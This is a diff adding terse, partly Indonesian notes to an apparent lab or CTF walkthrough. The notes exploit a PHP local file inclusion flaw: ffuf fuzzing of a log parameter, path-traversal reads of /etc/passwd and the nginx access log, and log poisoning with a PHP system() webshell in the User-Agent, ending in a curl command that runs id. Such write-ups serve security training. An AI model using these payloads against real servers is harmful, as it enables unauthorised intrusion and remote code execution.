@@ -167,3 +167,40 @@ php://filter/read=convert.base64-encode/resource=index
 view page source, lalu copy hasil index di dalam webnya yang (panjang itu)
 lalu ubah di burp suite menjadi base64
 
+jika sudah kita cari script ini
+```
+<?php 
+	// echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
+?>
+```
+
+dan buka http://server:port/ilf_admin/index.php
+
+lalu cek yang log maka nanti ada log?
+jika sudah
+
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://94.237.63.201:51059/ilf_admin/index.php?log=FUZZ --fs 2287
+ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://94.237.63.201:51059/ilf_admin/index.php?log=FUZZ --fs 2046
+
+2046 ini dari size yang banyak itu
+
+http://94.237.63.201:51059/ilf_admin/index.php?log=../../../../../etc/passwd
+http://94.237.63.201:51059/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log
+
+go burp suite and intrudute this url
+and change user agent to
+
+```bash
+GET /ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&id=ls HTTP/1.1
+Host: 94.237.48.147:53485
+User-Agent: <?php system($_GET[""]); ?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+```
+
+curl -s "http://94.237.49.120:37724/ilf_admin/index.php?log=../../../../../var/log/nginx/access.log&cmd=id" -A "<?php system($_GET['....']); ?>"
